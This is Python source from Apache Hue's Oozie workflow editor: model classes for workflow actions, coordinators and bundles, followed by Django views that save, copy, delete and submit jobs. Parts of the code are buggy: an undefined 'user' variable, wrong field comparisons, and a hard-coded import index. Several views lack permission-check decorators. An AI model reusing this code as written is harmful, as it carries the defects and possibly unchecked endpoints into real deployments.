          'help_text': _('Files put in the running directory.')
     },
     'archives': { 
          'name': 'archives',
          'label': _('Archives'),
          'value': [],
          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.')
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production')
     },
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.')
     },
     'job_xml': { 
          'name': 'job_xml',
          'label': _('Job XML'),
          'value': [],
          'help_text': _('Refer to a Hadoop JobConf job.xml')
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['mapper'], cls.FIELDS['reducer']]


class DistCpAction(Action):
  TYPE = 'distcp'
  FIELDS = {
     'distcp_parameters': { 
          'name': 'distcp_parameters',
          'label': _('Arguments'),
          'value': [{'value': ''}, {'value': ''}],
          'help_text': _('Options first, then source / destination paths'),
          'type': 'distcp'
     },
      # Common
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.')
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production')
     },
     'java_opts': { 
          'name': 'java_opts',
          'label': _('Java options'),
          'value': '',
          'help_text': _('Parameters for the JVM, e.g. -Dprop1=a -Dprop2=b')
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['distcp_parameters']]


class KillAction(Action):
  TYPE = 'kill'
  FIELDS = {
     'message': { 
          'name': 'message',
          'label': _('Message'),
          'value': _('Action failed, error message[${wf:errorMessage(wf:lastErrorNode())}]'),
          'help_text': _('Message to display when the workflow fails. Can contain some EL functions.'),
          'type': 'textarea'
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['message']]


class JoinAction(Action):
  TYPE = 'join'
  FIELDS = {}
  
  @classmethod
  def get_mandatory_fields(cls):
    return []


class ForkNode(Action):
  TYPE = 'fork'
  FIELDS = {}
  
  @classmethod
  def get_mandatory_fields(cls):
    return []


class DecisionNode(Action):
  TYPE = 'decision'
  FIELDS = {}
  
  @classmethod
  def get_mandatory_fields(cls):
    return []
  

NODES = {
  'start-widget': StartNode,
  'end-widget': EndNode,
  'pig-widget': PigAction,
  'java-widget': JavaAction,
  'hive-widget': HiveAction,
  'hive2-widget': HiveServer2Action,
  'sqoop-widget': SqoopAction,
  'mapreduce-widget': MapReduceAction,  
  'subworkflow-widget': SubWorkflowAction,
  'shell-widget': ShellAction,
  'ssh-widget': SshAction,  
  'fs-widget': FsAction,
  'email-widget': EmailAction,
  'streaming-widget': StreamingAction,
  'distcp-widget': DistCpAction,  
  'kill-widget': KillAction,
  'join-widget': JoinAction,
  'fork-widget': ForkNode,
  'decision-widget': DecisionNode,  
}


WORKFLOW_NODE_PROPERTIES = {}
for node in NODES.itervalues():
  WORKFLOW_NODE_PROPERTIES.update(node.FIELDS)



def find_parameters(instance, fields=None):
  """"""Find parameters in the given fields""""""
  if fields is None:
    fields = NODES['%s-widget' % instance.data['type']].FIELDS.keys()

  params = []
  for field in fields:
    data = instance.data['properties'][field]
    if field == 'sla' and not instance.sla_enabled:
      continue
    if isinstance(data, list):
      params.extend(find_json_parameters(data))
    elif isinstance(data, basestring):
      for match in Template.pattern.finditer(data):
        name = match.group('braced')
        if name is not None:
          params.append(name)

  return params

def find_json_parameters(fields):
  # Input is list of json dict
  params = []

  for field in fields:
    for data in field.values():
      if isinstance(data, basestring):
        for match in Template.pattern.finditer(data):
          name = match.group('braced')
          if name is not None:
            params.append(name)

  return params

def find_dollar_variables(text):
  return re.findall('[^\n\\\\]\$([^\{ \'\""\-;\(\)]+)', text, re.MULTILINE)  

def find_dollar_braced_variables(text):
  vars = set()
  
  for var in re.findall('\$\{(.+)\}', text, re.MULTILINE):  
    if ':' in var:
      var = var.split(':', 1)[1]    
    vars.add(var)
  
  return list(vars) 




def import_workflows_from_hue_3_7():
  return import_workflow_from_hue_3_7(OldWorflows.objects.filter(managed=True).filter(is_trashed=False)[12].get_full_node())


def import_workflow_from_hue_3_7(old_wf):
  """"""
  Example of data to transform

  [<Start: start>, <Pig: Pig>, [<Kill: kill>], [<End: end>]]
  [<Start: start>, <Java: TeraGenWorkflow>, <Java: TeraSort>, [<Kill: kill>], [<End: end>]]
  [<Start: start>, [<Fork: fork-34>, [[<Mapreduce: Sleep-1>, <Mapreduce: Sleep-10>], [<Mapreduce: Sleep-5>, [<Fork: fork-38>, [[<Mapreduce: Sleep-3>], [<Mapreduce: Sleep-4>]], <Join: join-39>]]], <Join: join-35>], [<Kill: kill>], [<End: end>]]
  """"""
  
  uuids = {}

  old_nodes = old_wf.get_hierarchy()
  
  wf = Workflow()
  wf_rows = []
  wf_nodes = []
  
  data = wf.get_data()
  
  # UUIDs node mapping
  for node in old_wf.node_list:    
    if node.name == 'kill':
      node_uuid = '17c9c895-5a16-7443-bb81-f34b30b21548'
    elif node.name == 'start':
      node_uuid = '3f107997-04cc-8733-60a9-a4bb62cebffc'
    elif node.name == 'end':
      node_uuid = '33430f0f-ebfa-c3ec-f237-3e77efa03d0a'
    else:
      node_uuid = str(uuid.uuid4())

    uuids[node.id] = node_uuid
    
  # Workflow
  data['workflow']['uuid'] = str(uuid.uuid4())
  data['workflow']['name'] = old_wf.name
  data['workflow']['properties']['properties'] = json.loads(old_wf.job_properties)
  data['workflow']['properties']['job_xml'] = old_wf.job_xml
  data['workflow']['properties']['description'] = old_wf.description
  data['workflow']['properties']['schema_version'] = old_wf.schema_version
  data['workflow']['properties']['deployment_dir'] = old_wf.deployment_dir
  data['workflow']['properties']['parameters'] = json.loads(old_wf.parameters)
  data['workflow']['properties']['description'] = old_wf.description
  data['workflow']['properties']['sla'] = old_wf.sla
  data['workflow']['properties']['sla_enabled'] = old_wf.sla_enabled
      
  # Layout
  rows = data['layout'][0]['rows']
  
  def _create_layout(nodes, size=12):
    wf_rows = []
    
    for node in nodes:      
      if type(node) == list and len(node) == 1:
        node = node[0]
      if type(node) != list:
        if node.node_type != 'kill': # No kill widget displayed yet
          wf_rows.append({""widgets"":[{""size"":size, ""name"": node.name.title(), ""id"":  uuids[node.id], ""widgetType"": ""%s-widget"" % node.node_type, ""properties"":{}, ""offset"":0, ""isLoading"":False, ""klass"":""card card-widget span%s"" % size, ""columns"":[]}]})
      else:
        if node[0].node_type == 'fork':
          wf_rows.append({""widgets"":[{""size"":size, ""name"": 'Fork', ""id"":  uuids[node[0].id], ""widgetType"": ""%s-widget"" % node[0].node_type, ""properties"":{}, ""offset"":0, ""isLoading"":False, ""klass"":""card card-widget span%s"" % size, ""columns"":[]}]})  
          
          wf_rows.append({  
            ""id"": str(uuid.uuid4()),
            ""widgets"":[  

            ],
            ""columns"":[  
               {  
                  ""id"": str(uuid.uuid4()),
                  ""size"": (size / len(node[1])),
                  ""rows"": 
                     [{  
                        ""id"": str(uuid.uuid4()),
                        ""widgets"": c['widgets'],
                        ""columns"":[]
                      } 
                    for c in col] if type(col) == list else [{  
                        ""id"": str(uuid.uuid4()),
                        ""widgets"": col['widgets'],
                        ""columns"":[]
                      }
                   ] 
                  ,                  
                  ""klass"":""card card-home card-column span%s"" % (size / len(node[1]))
               }
               for col in _create_layout(node[1], size)
            ]
          })
          
          wf_rows.append({""widgets"":[{""size"":size, ""name"": 'Join', ""id"":  uuids[node[2].id], ""widgetType"": ""%s-widget"" % node[2].node_type, ""properties"":{}, ""offset"":0, ""isLoading"":False, ""klass"":""card card-widget span%s"" % size, ""columns"":[]}]})
        else:
          wf_rows.append(_create_layout(node, size))
    
    return wf_rows
  
  wf_rows = _create_layout(old_nodes[1:-1])
    
  if wf_rows:
    data['layout'][0]['rows'] = [data['layout'][0]['rows'][0]] + wf_rows + [data['layout'][0]['rows'][-1]]


  # Content
  def _dig_nodes(nodes):
    for node in nodes:
      if type(node) != list:
        properties = {}
        if '%s-widget' % node.node_type in NODES and node.node_type != 'kill-widget':
          properties = dict(NODES['%s-widget' % node.node_type].get_fields())
        
        if node.node_type == 'pig-widget':
          properties['script_path'] = node.script_path
          properties['params'] = json.loads(node.params)
          properties['files'] = json.loads(node.files)
          properties['archives'] = json.loads(node.archives)
          properties['job_properties'] = json.loads(node.archives)          
          properties['prepares'] = json.loads(node.prepares)
          properties['job_xml'] = node.job_xml
          properties['description'] = node.description
          properties['sla'] = node.sla
          properties['sla_enabled'] = node.sla_enabled

        wf_nodes.append({
            ""id"": uuids[node.id],
            ""name"": '%s-%s' % (node.node_type.split('-')[0], uuids[node.id][:4]),
            ""type"": ""%s-widget"" % node.node_type,
            ""properties"": properties,
            ""children"":[{('to' if link.name in ('ok', 'start') else link.name): uuids[link.child.get_full_node().id]} for link in node.get_children_links()]
        })
      else:
        _dig_nodes(node)

  _dig_nodes(old_nodes)
  
  data['workflow']['nodes'] = wf_nodes

  return Workflow(data=json.dumps(data))



class Coordinator(Job):
  XML_FILE_NAME = 'coordinator.xml'
  PROPERTY_APP_PATH = 'oozie.coord.application.path'
  HUE_ID = 'hue-id-c'

  def __init__(self, data=None, json_data=None, document=None):
    self.document = document

    if document is not None:
      self._data = json.loads(document.data)
    elif json_data is not None:
      self._data = json.loads(json_data)
    elif data is not None:
      self._data = data
    else:
      self._data = {
          'id': None, 
          'uuid': None,
          'name': 'My Coordinator',
          'variables': [],
          'properties': {
              'deployment_dir': '',
              'schema_version': 'uri:oozie:coordinator:0.2',
              'frequency_number': 1,
              'frequency_unit': 'days',
              'cron_frequency': '0 0 * * *',
              'cron_advanced': False,
              'timezone': 'America/Los_Angeles',
              'start': datetime.today(),
              'end': datetime.today() + timedelta(days=3),
              'workflow': None,
              'timeout': None,
              'concurrency': None,
              'execution': None,
              'throttle': None,
              'job_xml': '',
              'sla_enabled': False,
              'sla_workflow_enabled': False,
              'credentials': [],
              'parameters': [{'name': 'oozie.use.system.libpath', 'value': True}],
              'properties': [], # Aka workflow parameters
              'sla': Workflow.SLA_DEFAULT
          }
      }

  @property
  def id(self):
    return self.document.id

  @property
  def uuid(self):
    return self.document.uuid

  def json_for_html(self):
    _data = self.data.copy()

    _data['properties']['start'] = _data['properties']['start'].strftime('%Y-%m-%dT%H:%M:%S')
    _data['properties']['end'] = _data['properties']['end'].strftime('%Y-%m-%dT%H:%M:%S')

    return json.dumps(_data, cls=JSONEncoderForHTML)
 
  @property
  def data(self):
    if type(self._data['properties']['start']) == unicode:
      self._data['properties']['start'] = parse(self._data['properties']['start'])
      
    if type(self._data['properties']['end']) == unicode:
      self._data['properties']['end'] = parse(self._data['properties']['end'])    

    if self.document is not None:
      self._data['id'] = self.document.id

    return self._data
  
  @property
  def name(self):
    return self.data['name']

  @property      
  def deployment_dir(self):
    if not self.data['properties'].get('deployment_dir'):
      self.data['properties']['deployment_dir'] = Job.get_workspace(user)    
    return self.data['properties']['deployment_dir']
  
  def find_parameters(self):
    params = set()

    if self.sla_enabled:
      for param in find_json_parameters(self.sla):
        params.add(param)

# get missed params from wf

#    for prop in self.workflow.get_parameters():
#      if not prop['name'] in index:
#        props.append(prop)
#        index.append(prop['name'])
#
#    # Remove DataInputs and DataOutputs
#    datainput_names = [_input.name for _input in self.datainput_set.all()]
#    dataoutput_names = [_output.name for _output in self.dataoutput_set.all()]
#    removable_names = datainput_names + dataoutput_names
#    props = filter(lambda prop: prop['name'] not in removable_names, props)

# get $params in wf properties
# [{'name': parameter['workflow_variable'], 'value': parameter['dataset_variable']} for parameter in self.data['variables'] if parameter['dataset_type'] == 'parameter']

    return dict([(param, '') for param in list(params)])
  
  @property      
  def sla_enabled(self):
    return self.data['properties']['sla_enabled']

  @property      
  def sla(self):
    return self.data['properties']['sla']
  
  @property      
  def parameters(self):
    return self.data['properties']['parameters']
  
  @property
  def datasets(self):
    return self.inputDatasets + self.outputDatasets
  
  @property
  def inputDatasets(self):    
    return [Dataset(dataset) for dataset in self.data['variables'] if dataset['dataset_type'] == 'input_path']
    
  @property
  def outputDatasets(self):
    return [Dataset(dataset) for dataset in self.data['variables'] if dataset['dataset_type'] == 'output_path']

  @property
  def start_utc(self):
    return utc_datetime_format(self.data['properties']['start'])

  @property
  def end_utc(self):
    return utc_datetime_format(self.data['properties']['end'])

  @property
  def frequency(self):
    return '${coord:%(unit)s(%(number)d)}' % {'unit': self.data['properties']['frequency_unit'], 'number': self.data['properties']['frequency_number']}

  @property
  def cron_frequency(self):
    data_dict = self.data['properties']
    
    if 'cron_frequency' in data_dict:
      return data_dict['cron_frequency']
    else:
      # Backward compatibility
      freq = '0 0 * * *'
      if data_dict['frequency_number'] == 1:
        if data_dict['frequency_number'] == 'MINUTES':
          freq = '* * * * *'
        elif data_dict['frequency_number'] == 'HOURS':
          freq = '0 * * * *'
        elif data_dict['frequency_number'] == 'DAYS':
          freq = '0 0 * * *'
        elif data_dict['frequency_number'] == 'MONTH':
          freq = '0 0 * * *'
      return {'frequency': freq, 'isAdvancedCron': False}

  def to_xml(self, mapping=None):
    if mapping is None:
      mapping = {}

    tmpl = ""editor/gen2/coordinator.xml.mako""
    return re.sub(re.compile('\s*\n+', re.MULTILINE), '\n', django_mako.render_to_string(tmpl, {'coord': self, 'mapping': mapping})).encode('utf-8', 'xmlcharrefreplace') 
  
  @property
  def properties(self):    
    props = [{'name': dataset['workflow_variable'], 'value': dataset['dataset_variable']} for dataset in self.data['variables'] if dataset['dataset_type'] == 'parameter']
    props += self.data['properties']['properties']
    return props


class Dataset():

  def __init__(self, data):
    self._data = data

  @property
  def data(self):
    if type(self._data['start']) == unicode: 
      self._data['start'] = parse(self._data['start'])

    self._data['name'] = self._data['workflow_variable']

    return self._data      
      
  @property
  def frequency(self):
    return '${coord:%(unit)s(%(number)d)}' % {'unit': self.data['frequency_unit'], 'number': self.data['frequency_number']}
      
  @property
  def start_utc(self):
    return utc_datetime_format(self.data['start'])

  @property
  def start_instance(self):
    if not self.is_advanced_start_instance:
      return int(self.data['advanced_start_instance'])
    else:
      return 0

  @property
  def is_advanced_start_instance(self):
    return not self.is_int(self.data['advanced_start_instance'])

  def is_int(self, text):
    try:
      int(text)
      return True
    except ValueError:
      return False

  @property
  def end_instance(self):
    if not self.is_advanced_end_instance:
      return int(self.data['advanced_end_instance'])
    else:
      return 0

  @property
  def is_advanced_end_instance(self):
    return not self.is_int(self.data['advanced_end_instance'])



class Bundle(Job):
  XML_FILE_NAME = 'bundle.xml'
  PROPERTY_APP_PATH = 'oozie.bundle.application.path'
  HUE_ID = 'hue-id-b'

  def __init__(self, data=None, json_data=None, document=None):
    self.document = document

    if document is not None:
      self._data = json.loads(document.data)
    elif json_data is not None:
      self._data = json.loads(json_data)
    elif data is not None:
      self._data = data
    else:
      self._data = {
          'id': None, 
          'uuid': None,
          'name': 'My Bundle',
          'coordinators': [],
          'properties': {
              'deployment_dir': '',
              'schema_version': 'uri:oozie:bundle:0.2',
              'kickoff': datetime.today(),
              'parameters': [{'name': 'oozie.use.system.libpath', 'value': True}]
          }
      }

  @property
  def id(self):
    return self.document.id

  @property
  def uuid(self):
    return self.document.uuid

  def json_for_html(self):
    _data = self.data.copy()

    _data['properties']['kickoff'] = _data['properties']['kickoff'].strftime('%Y-%m-%dT%H:%M:%S')

    return json.dumps(_data, cls=JSONEncoderForHTML)
 
  @property
  def data(self):
    if type(self._data['properties']['kickoff']) == unicode:
      self._data['properties']['kickoff'] = parse(self._data['properties']['kickoff'])

    if self.document is not None:
      self._data['id'] = self.document.id

    return self._data
 
  def to_xml(self, mapping=None):
    if mapping is None:
      mapping = {}

    mapping.update(dict(list(Document2.objects.filter(type='oozie-coordinator2', uuid__in=self.data['coordinators']).values('uuid', 'name'))))
    tmpl = ""editor/gen2/bundle.xml.mako""
    return force_unicode(
              re.sub(re.compile('\s*\n+', re.MULTILINE), '\n', django_mako.render_to_string(tmpl, {
                'bundle': self,
                'mapping': mapping
           })))
  
  
  @property      
  def name(self):
    return self.data['name']
  
  @property      
  def parameters(self):
    return self.data['properties']['parameters']  
  
  @property
  def kick_off_time_utc(self):
    return utc_datetime_format(self.data['properties']['kickoff'])  
  
  @property      
  def deployment_dir(self):
    if not self.data['properties'].get('deployment_dir'):
      self.data['properties']['deployment_dir'] = Job.get_workspace(user)    
    return self.data['properties']['deployment_dir']
  
  def find_parameters(self):
    return {}
/n/n/napps/oozie/src/oozie/views/editor2.py/n/n#!/usr/bin/env python
# Licensed to Cloudera, Inc. under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  Cloudera, Inc. licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import json
import logging
import uuid

from django.core.urlresolvers import reverse
from django.forms.formsets import formset_factory
from django.http import HttpResponse
from django.shortcuts import redirect
from django.utils.translation import ugettext as _

from desktop.lib.django_util import render
from desktop.lib.exceptions_renderable import PopupException
from desktop.lib.i18n import smart_str
from desktop.lib.rest.http_client import RestException
from desktop.lib.json_utils import JSONEncoderForHTML
from desktop.models import Document, Document2

from liboozie.credentials import Credentials
from liboozie.oozie_api import get_oozie
from liboozie.submission2 import Submission

from oozie.decorators import check_document_access_permission, check_document_modify_permission
from oozie.forms import ParameterForm
from oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\
    find_dollar_variables, find_dollar_braced_variables


LOG = logging.getLogger(__name__)



def list_editor_workflows(request):  
  workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]

  return render('editor/list_editor_workflows.mako', request, {
      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML)
  })


@check_document_access_permission()
def edit_workflow(request):
  workflow_id = request.GET.get('workflow')
  
  if workflow_id:
    wid = {}
    if workflow_id.isdigit():
      wid['id'] = workflow_id
    else:
      wid['uuid'] = workflow_id
    doc = Document2.objects.get(type='oozie-workflow2', **wid)
    workflow = Workflow(document=doc)
  else:
    doc = None
    workflow = Workflow()
    workflow.set_workspace(request.user)
    workflow.check_workspace(request.fs, request.user)
  
  workflow_data = workflow.get_data()

  api = get_oozie(request.user)
  credentials = Credentials()
  
  try:  
    credentials.fetch(api)
  except Exception, e:
    LOG.error(smart_str(e))

  return render('editor/workflow_editor.mako', request, {
      'layout_json': json.dumps(workflow_data['layout'], cls=JSONEncoderForHTML),
      'workflow_json': json.dumps(workflow_data['workflow'], cls=JSONEncoderForHTML),
      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),
      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES, cls=JSONEncoderForHTML),
      'doc1_id': doc.doc.get().id if doc else -1,
      'subworkflows_json': json.dumps(_get_workflows(request.user), cls=JSONEncoderForHTML),
      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))
  })


def new_workflow(request):
  return edit_workflow(request)


def delete_workflow(request):
  if request.method != 'POST':
    raise PopupException(_('A POST request is required.'))

  jobs = json.loads(request.POST.get('selection'))

  for job in jobs:
    doc2 = Document2.objects.get(id=job['id'])
    doc = doc2.doc.get()
    doc.can_write_or_exception(request.user)
    
    doc.delete()
    doc2.delete()

  response = {}
  request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow deleted.'))
  
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_access_permission()
def copy_workflow(request):
  if request.method != 'POST':
    raise PopupException(_('A POST request is required.'))

  jobs = json.loads(request.POST.get('selection'))

  for job in jobs:
    doc2 = Document2.objects.get(type='oozie-workflow2', id=job['id'])
    
    name = doc2.name + '-copy'
    copy_doc = doc2.doc.get().copy(name=name, owner=request.user)
  
    doc2.pk = None
    doc2.id = None
    doc2.uuid = str(uuid.uuid4())
    doc2.name = name
    doc2.owner = request.user    
    doc2.save()
  
    doc2.doc.all().delete()
    doc2.doc.add(copy_doc)
    
    workflow = Workflow(document=doc2)
    workflow.update_name(name)
    doc2.update_data({'workflow': workflow.get_data()['workflow']})
    doc2.save()

    workflow.set_workspace(request.user)
    workflow.check_workspace(request.fs, request.user)

  response = {}  
  request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.'))

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_modify_permission()
def save_workflow(request):
  response = {'status': -1}

  workflow = json.loads(request.POST.get('workflow', '{}'))
  layout = json.loads(request.POST.get('layout', '{}'))

  if workflow.get('id'):
    workflow_doc = Document2.objects.get(id=workflow['id'])
  else:      
    workflow_doc = Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user)
    Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2')

  subworkflows = [node['properties']['workflow'] for node in workflow['nodes'] if node['type'] == 'subworkflow-widget']
  if subworkflows:
    dependencies = Document2.objects.filter(uuid__in=subworkflows)
    workflow_doc.dependencies = dependencies

  workflow_doc.update_data({'workflow': workflow})
  workflow_doc.update_data({'layout': layout})
  workflow_doc.name = workflow['name']
  workflow_doc.save()
  
  workflow_instance = Workflow(document=workflow_doc)
  
  response['status'] = 0
  response['id'] = workflow_doc.id
  response['doc1_id'] = workflow_doc.doc.get().id
  response['message'] = _('Page saved !')

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def new_node(request):
  response = {'status': -1}

  node = json.loads(request.POST.get('node', '{}'))

  properties = NODES[node['widgetType']].get_mandatory_fields()
  workflows = []

  if node['widgetType'] == 'subworkflow-widget':
    workflows = _get_workflows(request.user)

  response['status'] = 0
  response['properties'] = properties 
  response['workflows'] = workflows
  
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def _get_workflows(user):
  return [{
        'name': workflow.name,
        'owner': workflow.owner.username,
        'value': workflow.uuid,
        'id': workflow.id
      } for workflow in [d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')]
    ]  


def add_node(request):
  response = {'status': -1}

  node = json.loads(request.POST.get('node', '{}'))
  properties = json.loads(request.POST.get('properties', '{}'))
  copied_properties = json.loads(request.POST.get('copiedProperties', '{}'))

  _properties = dict(NODES[node['widgetType']].get_fields())
  _properties.update(dict([(_property['name'], _property['value']) for _property in properties]))

  if copied_properties:
    _properties.update(copied_properties)

  response['status'] = 0
  response['properties'] = _properties
  response['name'] = '%s-%s' % (node['widgetType'].split('-')[0], node['id'][:4])

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def action_parameters(request):
  response = {'status': -1}
  parameters = set()

  try:
    node_data = json.loads(request.POST.get('node', '{}'))
    
    parameters = parameters.union(set(Node(node_data).find_parameters()))
    
    script_path = node_data.get('properties', {}).get('script_path', {})
    if script_path:
      script_path = script_path.replace('hdfs://', '')

      if request.fs.do_as_user(request.user, request.fs.exists, script_path):
        data = request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2)  

        if node_data['type'] in ('hive', 'hive2'):
          parameters = parameters.union(set(find_dollar_braced_variables(data)))
        elif node_data['type'] == 'pig':
          parameters = parameters.union(set(find_dollar_variables(data)))
                
    response['status'] = 0
    response['parameters'] = list(parameters)
  except Exception, e:
    response['message'] = str(e)
    
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_access_permission()
def workflow_parameters(request):
  response = {'status': -1}

  try:
    workflow = Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) 

    response['status'] = 0
    response['parameters'] = workflow.find_all_parameters(with_lib_path=False)
  except Exception, e:
    response['message'] = str(e)
    
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def gen_xml_workflow(request):
  response = {'status': -1}

  try:
    workflow_json = json.loads(request.POST.get('workflow', '{}'))
  
    workflow = Workflow(workflow=workflow_json)
  
    response['status'] = 0
    response['xml'] = workflow.to_xml()
  except Exception, e:
    response['message'] = str(e)
    
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_access_permission()
def submit_workflow(request, doc_id):
  workflow = Workflow(document=Document2.objects.get(id=doc_id))
  ParametersFormSet = formset_factory(ParameterForm, extra=0)

  if request.method == 'POST':
    params_form = ParametersFormSet(request.POST)    

    if params_form.is_valid():
      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])

      job_id = _submit_workflow(request.user, request.fs, request.jt, workflow, mapping)

      request.info(_('Workflow submitted'))
      return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))
    else:
      request.error(_('Invalid submission form: %s' % params_form.errors))
  else:
    parameters = workflow.find_all_parameters()
    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))
    params_form = ParametersFormSet(initial=initial_params)

    popup = render('editor/submit_job_popup.mako', request, {
                     'params_form': params_form,
                     'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id})
                   }, force_template=True).content
    return HttpResponse(json.dumps(popup), mimetype=""application/json"")


def _submit_workflow(user, fs, jt, workflow, mapping):
  try:
    submission = Submission(user, workflow, fs, jt, mapping)
    job_id = submission.run()
    return job_id
  except RestException, ex:
    detail = ex._headers.get('oozie-error-message', ex)
    if 'Max retries exceeded with url' in str(detail):
      detail = '%s: %s' % (_('The Oozie server is not running'), detail)
    LOG.error(smart_str(detail))
    raise PopupException(_(""Error submitting workflow %s"") % (workflow,), detail=detail)

  return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))



def list_editor_coordinators(request):
  coordinators = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]

  return render('editor/list_editor_coordinators.mako', request, {
      'coordinators': coordinators
  })


@check_document_access_permission()
def edit_coordinator(request):
  coordinator_id = request.GET.get('coordinator')
  doc = None
  
  if coordinator_id:
    doc = Document2.objects.get(id=coordinator_id)
    coordinator = Coordinator(document=doc)
  else:
    coordinator = Coordinator()

  api = get_oozie(request.user)
  credentials = Credentials()
  
  try:  
    credentials.fetch(api)
  except Exception, e:
    LOG.error(smart_str(e))

  workflows = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])
                                    for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]

  if coordinator_id and not filter(lambda a: a['uuid'] == coordinator.data['properties']['workflow'], workflows):
    raise PopupException(_('You don\'t have access to the workflow of this coordinator.'))

  return render('editor/coordinator_editor.mako', request, {
      'coordinator_json': coordinator.json_for_html(),
      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),
      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML),
      'doc1_id': doc.doc.get().id if doc else -1,
      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))
  })


def new_coordinator(request):
  return edit_coordinator(request)


@check_document_modify_permission()
def save_coordinator(request):
  response = {'status': -1}

  coordinator_data = json.loads(request.POST.get('coordinator', '{}'))

  if coordinator_data.get('id'):
    coordinator_doc = Document2.objects.get(id=coordinator_data['id'])
  else:      
    coordinator_doc = Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user)
    Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2')

  if coordinator_data['properties']['workflow']:
    dependencies = Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow'])
    for doc in dependencies:
      doc.doc.get().can_read_or_exception(request.user)
    coordinator_doc.dependencies = dependencies

  coordinator_doc.update_data(coordinator_data)
  coordinator_doc.name = coordinator_data['name']
  coordinator_doc.save()
  
  response['status'] = 0
  response['id'] = coordinator_doc.id
  response['message'] = _('Saved !')

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def gen_xml_coordinator(request):
  response = {'status': -1}

  coordinator_dict = json.loads(request.POST.get('coordinator', '{}'))

  coordinator = Coordinator(data=coordinator_dict)

  response['status'] = 0
  response['xml'] = coordinator.to_xml()
    
  return HttpResponse(json.dumps(response), mimetype=""application/json"") 


@check_document_access_permission()
def submit_coordinator(request, doc_id):
  coordinator = Coordinator(document=Document2.objects.get(id=doc_id))  
  ParametersFormSet = formset_factory(ParameterForm, extra=0)

  if request.method == 'POST':
    params_form = ParametersFormSet(request.POST)

    if params_form.is_valid():
      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])
      job_id = _submit_coordinator(request, coordinator, mapping)

      request.info(_('Coordinator submitted.'))
      return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id}))
    else:
      request.error(_('Invalid submission form: %s' % params_form.errors))
  else:
    parameters = coordinator.find_all_parameters()
    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))
    params_form = ParametersFormSet(initial=initial_params)

  popup = render('editor/submit_job_popup.mako', request, {
                 'params_form': params_form,
                 'action': reverse('oozie:editor_submit_coordinator',  kwargs={'doc_id': coordinator.id})
                }, force_template=True).content
  return HttpResponse(json.dumps(popup), mimetype=""application/json"")


def _submit_coordinator(request, coordinator, mapping):
  try:
    wf_doc = Document2.objects.get(uuid=coordinator.data['properties']['workflow'])
    wf_dir = Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy()

    properties = {'wf_application_path': request.fs.get_hdfs_path(wf_dir)}
    properties.update(mapping)

    submission = Submission(request.user, coordinator, request.fs, request.jt, properties=properties)
    job_id = submission.run()

    return job_id
  except RestException, ex:
